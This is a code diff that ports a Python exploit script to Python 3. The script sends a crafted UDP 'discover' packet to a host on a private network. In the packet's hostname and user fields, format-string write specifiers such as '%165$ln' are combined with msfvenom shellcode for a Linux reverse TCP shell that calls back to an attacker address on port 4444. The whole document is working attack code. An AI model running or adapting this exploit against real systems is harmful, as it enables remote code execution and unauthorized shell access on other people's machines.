@@ -15,18 +15,40 @@ ip = '10.0.2.15'
 port = 50001
 
 def gen_discover_packet(ad_id, os, hn, user, inf, func):
-  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
-  d += struct.pack('>I', ad_id)
-  d += struct.pack('>I', 0)
-  d += chr(0x2)+chr(os)
-  d += struct.pack('>I', len(hn)) + hn
-  d += struct.pack('>I', len(user)) + user
-  d += struct.pack('>I', 0)
-  d += struct.pack('>I', len(inf)) + inf
-  d += chr(0)
-  d += struct.pack('>I', len(func)) + func
-  d += chr(0x2)+chr(0xc3)+chr(0x51)
-  return d
+    d  = bytes([0x3e, 0xd1, 0x1])
+    d += struct.pack('>I', ad_id)
+    d += struct.pack('>I', 0)
+    d += bytes([0x2, os])
+
+    # Check if hn is a byte string or a regular string and handle accordingly
+    if isinstance(hn, str):
+        d += struct.pack('>I', len(hn)) + hn.encode()
+    else:
+        d += struct.pack('>I', len(hn)) + hn
+
+    # Similar check for user, inf, and func
+    if isinstance(user, str):
+        d += struct.pack('>I', len(user)) + user.encode()
+    else:
+        d += struct.pack('>I', len(user)) + user
+
+    d += struct.pack('>I', 0)
+
+    if isinstance(inf, str):
+        d += struct.pack('>I', len(inf)) + inf.encode()
+    else:
+        d += struct.pack('>I', len(inf)) + inf
+
+    d += bytes([0])
+
+    if isinstance(func, str):
+        d += struct.pack('>I', len(func)) + func.encode()
+    else:
+        d += struct.pack('>I', len(func)) + func
+
+    d += bytes([0x2, 0xc3, 0x51])
+    return d
+
 
 # msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.2.5 LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
 shellcode =  b""
@@ -43,7 +65,8 @@ shellcode += b"\xb5\xf4\x61\x7e\xa6\x43\x33\xe6\x91\xd4\xe8"
 shellcode += b"\xcb\xe1\xcf\xd4\xb4\xc6\x9c\x61\x2d"
 
 print('sending payload ...')
-p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
+p = gen_discover_packet(4919, 1, b'\x85\xfe%1$*1$x%18x%165$ln' + shellcode, b'\x85\xfe%18472249x%93$ln', 'ad', 'main')
+
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 s.sendto(p, (ip, port))
 s.close()
